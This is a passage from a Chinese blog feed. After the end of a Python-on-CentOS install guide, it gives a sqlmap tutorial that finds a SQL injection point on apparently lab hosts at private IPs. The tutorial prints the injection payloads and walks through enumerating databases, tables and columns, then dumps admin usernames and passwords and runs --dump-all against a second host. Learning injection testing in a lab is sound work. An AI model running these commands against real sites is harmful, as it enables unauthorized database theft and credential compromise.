lrwxrwxrwx. &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root   &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; 11月 &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; 17:40 python2-config -&amp;gt; python2.7-config
lrwxrwxrwx. &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root   &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; 11月 &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; 17:40 python-config -&amp;gt; python2-config
&lt;span style=&#34;color:#75715e&#34;&gt;####&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 可以看出python指向python2，最终指向python2.7&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2编译安装-python&#34;&gt;2.编译安装 Python&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;yum -y install zlib zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel libffi-devel gcc-c++
&lt;span style=&#34;color:#75715e&#34;&gt;# 安装软件依赖以编译文件（可选）&lt;/span&gt;
yum -y install gcc-c++ openssl-devel libffi-devel bzip2-devel
&lt;span style=&#34;color:#75715e&#34;&gt;# 安装软件依赖以编译文件（必须有）&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 下载 Python 源码，解压，然后进入文件夹，编译到对应目录，安装&lt;/span&gt;
wget http://npm.taobao.org/mirrors/python/3.9.0/Python-3.9.0.tgz
tar -zxvf Python-3.9.0.tgz
cd Python-3.9.0 &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Failure&amp;#34;&lt;/span&gt;; exit 1; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
./configure --prefix&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/usr/local/python3
make &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; make install
&lt;span style=&#34;color:#75715e&#34;&gt;# 编译安装后，使用 ln 进行软链接&lt;/span&gt;
ln -s /usr/local/python3/bin/python3 /usr/bin/python3
ln -s /usr/local/python3/bin/pip3 /usr/bin/pip3
&lt;span style=&#34;color:#75715e&#34;&gt;# 配置 pip 源&lt;/span&gt;
pip3 config set global.index-url https://mirrors.aliyun.com/pypi/simple/
&lt;span style=&#34;color:#75715e&#34;&gt;# 使用&lt;/span&gt;
python3 -V
pip3 -V
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3其他&#34;&gt;3.其他&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 若要将 python 命令指向 python3，可以先删除原链接再重新指向。但这里不推荐这样做，因为 Linux 的部分包需要使用 python2&lt;/span&gt;
rm /usr/bin/python
ln -s python3 /usr/bin/python
&lt;span style=&#34;color:#75715e&#34;&gt;# 如需切换回 python2&lt;/span&gt;
ln -s python2 /usr/bin/python
&lt;span style=&#34;color:#75715e&#34;&gt;# pip&lt;/span&gt;
cd /usr/bin
mv pip pip.bak &lt;span style=&#34;color:#75715e&#34;&gt;#备份&lt;/span&gt;
ln -s pip3 /usr/bin/pip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Net—sqlmap 使用实例</title>
        <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netsqlmap-%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B/</link>
        <pubDate>Sat, 21 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netsqlmap-%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B/</guid>
        <description>&lt;h2 id=&#34;1第一步查找注入点&#34;&gt;1.第一步：查找注入点&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;192.168.3.59/article.php?id=1&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#必须带上GET参数，否则sqlmap不知道如何注入&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~# sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;192.168.3.59/article.php?id=1&amp;#39;&lt;/span&gt;
        ___
       __H__
 ___ ___&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;_____ ___ ___  &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;1.1.11#stable&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
|_ -| . &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;.&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;     | .&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;| . |
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|___|_  [(]_|_|_|__,|  _|
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;      |_|V          |_|   http://sqlmap.org
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&amp;#39;&lt;/span&gt;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; any misuse or damage caused by this program

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; starting at 11:30:43

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:30:43&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; resuming back-end DBMS &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mysql&amp;#39;&lt;/span&gt; 
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:30:43&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; testing connection to the target URL
sqlmap resumed the following injection point&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; from stored session:
---
Parameter: id &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;GET&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; AND 1817&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1817&lt;/span&gt;

    Type: AND/OR time-based blind
    Title: MySQL &amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 5.0.12 AND time-based blind
    Payload: id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; AND SLEEP&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;5&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

    Type: UNION query
    Title: Generic UNION query &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;NULL&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; - &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; columns
    Payload: id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;-2184 UNION ALL SELECT NULL,CONCAT&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x716b707071,0x517964767671746351415543654b4b794171664b78754b57434b70774c6b56434b6a46786a4d5a76,0x717a706271&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-- BgjA
---
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:30:43&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL &amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 5.0.12
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:30:43&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; fetched data logged to text files under &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/root/.sqlmap/output/192.168.3.59&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; shutting down at 11:30:43
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;**结果：**出现Parameter: id (GET)等内容，存在注入点&lt;/p&gt;
&lt;h2 id=&#34;2第二步查找数据库&#34;&gt;2.第二步：查找数据库&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;192.168.3.59/article.php?id=1&amp;#39;&lt;/span&gt; --dbs    &lt;span style=&#34;color:#75715e&#34;&gt;#查找数据库&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#........#&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:37:43&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL &amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 5.0.12
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:37:43&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; fetching database names
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:37:43&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; the SQL query used returns &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; entries
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:37:43&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; retrieved: information_schema
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:37:43&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; retrieved: website
available databases &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;:                                                       
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; information_schema
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; website
&lt;span style=&#34;color:#75715e&#34;&gt;#......#&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;**结果：**注入发现两个数据库information_schema和website。information_schema主要是mysql数据库、表、列的信息，没有什么用处，website是网站的数据，对这个数据库进行注入。&lt;/p&gt;
&lt;h2 id=&#34;3第三步注入&#34;&gt;3.第三步：注入&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;192.168.3.59/article.php?id=1&amp;#39;&lt;/span&gt; -D website --tables  &lt;span style=&#34;color:#75715e&#34;&gt;#对website表注入&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#。。。。。#&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:41:14&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL &amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 5.0.12
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:41:14&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; fetching tables &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; database: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;website&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:41:14&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; the SQL query used returns &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; entries
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:41:14&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; retrieved: admin
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:41:14&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; retrieved: articles
Database: website                                                              
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; tables&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+----------+
| admin    |
| articles |
+----------+
&lt;span style=&#34;color:#75715e&#34;&gt;#..........#&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;**结果：**发现有两张表admin、articles，选择注入admin&lt;/p&gt;
&lt;h2 id=&#34;4第四步读取数据&#34;&gt;4.第四步：读取数据&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;192.168.3.59/article.php?id=1&amp;#39;&lt;/span&gt; -D website -T admin --columns  &lt;span style=&#34;color:#75715e&#34;&gt;#读取admin表中列&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#..............#&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:43:46&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL &amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 5.0.12
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:43:46&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; fetching columns &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; table &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt; in database &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;website&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:43:47&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; the SQL query used returns &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; entries
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:43:47&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; retrieved: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;int(11)&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:43:47&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; retrieved: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;text&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:43:47&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; retrieved: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pass&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;text&amp;#34;&lt;/span&gt;
Database: website                                                              
Table: admin
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; columns&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+--------+---------+
| Column | Type    |
+--------+---------+
| user   | text    |
| id     | int&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;11&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; |
| pass   | text    |
+--------+---------+
&lt;span style=&#34;color:#75715e&#34;&gt;#............#&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;**结果：**注入得到了三列user、id、pass，只要得到user和pass，就能得到密码(一般是网站后台管理的登录密码)&lt;/p&gt;
&lt;h2 id=&#34;5第五步查看数据&#34;&gt;5.第五步：查看数据&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;192.168.3.59/article.php?id=1&amp;#39;&lt;/span&gt; -D website -T admin -C user,pass --dump &lt;span style=&#34;color:#75715e&#34;&gt;#将uesr，pass数据输出&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#..........#&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:47:33&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL &amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 5.0.12
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:47:33&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; fetching entries of column&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;`user`, pass&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; table &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt; in database &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;website&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:47:33&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; the SQL query used returns &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; entries
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:47:33&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; retrieved: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test1&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;123456&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:47:33&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; retrieved: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test2&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;123456&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;11:47:33&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; retrieved: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test3&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;123456&amp;#34;&lt;/span&gt;
Database: website                                                              
Table: admin
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; entries&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+--------+--------+
| user   | pass   |
+--------+--------+
| test1  | &lt;span style=&#34;color:#ae81ff&#34;&gt;123456&lt;/span&gt; |
| test2  | &lt;span style=&#34;color:#ae81ff&#34;&gt;123456&lt;/span&gt; |
| test3  | &lt;span style=&#34;color:#ae81ff&#34;&gt;123456&lt;/span&gt; |
+--------+--------+
&lt;span style=&#34;color:#75715e&#34;&gt;#............#&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;**结果：**可以查看到用户名与密码&lt;/p&gt;
&lt;h2 id=&#34;6尝试一下&#34;&gt;6.尝试一下&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.1.188/vprproject/index.php/Home/Video/index/id/189*&amp;#34;&lt;/span&gt; --batch -D test_vprctrl -T adminer --dump

sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.1.188/vprproject/index.php/Home/Video/index/id/189*&amp;#34;&lt;/span&gt; --batch -D test_vprctrl -T adminer -columns 

sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.1.188/vprproject/index.php/Home/Video/index/id/189*&amp;#34;&lt;/span&gt; --batch -D test_vprctrl --tables

sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.1.188/vprproject/index.php/Home/Video/index/id/189*&amp;#34;&lt;/span&gt; --batch -D test_vprctrl --dump-all

